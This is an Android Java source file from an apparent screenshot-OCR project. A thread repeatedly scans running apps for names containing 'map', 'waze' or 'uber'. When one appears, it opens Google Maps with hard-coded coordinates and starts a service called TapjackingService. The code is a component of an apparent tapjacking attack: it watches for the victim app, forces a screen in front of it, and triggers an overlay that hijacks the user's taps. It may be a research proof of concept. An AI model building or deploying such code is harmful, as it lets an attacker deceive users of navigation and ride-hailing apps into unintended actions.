package net.rahar.screenshotocr;

import android.app.ActivityManager;
import android.content.Context;
import android.content.Intent;
import android.graphics.Bitmap;
import android.graphics.BitmapFactory;
import android.media.MediaScannerConnection;
import android.net.Uri;
import android.os.Environment;
import android.os.Looper;
import android.util.Log;
import android.view.View;
import android.widget.LinearLayout;
import android.widget.Toast;

import com.jaredrummler.android.processes.ProcessManager;
import com.jaredrummler.android.processes.models.AndroidAppProcess;

import java.io.File;
import java.io.FileOutputStream;
import java.util.Date;
import java.util.List;

/**
 * Created by Dodobal-2 on 5/17/2016.
 */
class ListenActivity extends Thread{
    boolean exit = false;
    ActivityManager am = null;
    Context context = null;
    public static int flag=0;
    public ListenActivity(Context con){
        context = con;
        am = (ActivityManager) context.getSystemService(Context.ACTIVITY_SERVICE);
    }

    public void run(){

        Looper.prepare();
        while(!exit){
            int currentapiVersion = android.os.Build.VERSION.SDK_INT;
            List<AndroidAppProcess> processes = ProcessManager.getRunningAppProcesses();
            for (AndroidAppProcess process:processes) {
                String pkgName = process.getPackageName();
                if (pkgName.contains("map") || pkgName.contains("waze") || pkgName.contains("uber")){
                //if (pkgName.contains("uber")){
                    Toast.makeText(context, "Google Maps or waze is running", Toast.LENGTH_LONG).show();
                    Log.d("aaa","pkgname  " + pkgName);

                    //Intent intent=new Intent(Intent.ACTION_VIEW, Uri.parse("http://maps.google.com/maps?saddr=35.6895,139.6917&daddr=35.6896,139.6921")); //Japan
                    Intent intent=new Intent(Intent.ACTION_VIEW, Uri.parse("http://maps.google.com/maps?saddr=52.3702,4.8952&daddr=52.3703,4.8955")); //Nether
                    context.startActivity(intent);
                    flag=1;
                    exit=true;
                    context.startService(new Intent(TapjackingService.class.getName()));
                }
            }
        }
        Looper.loop();
    }
}
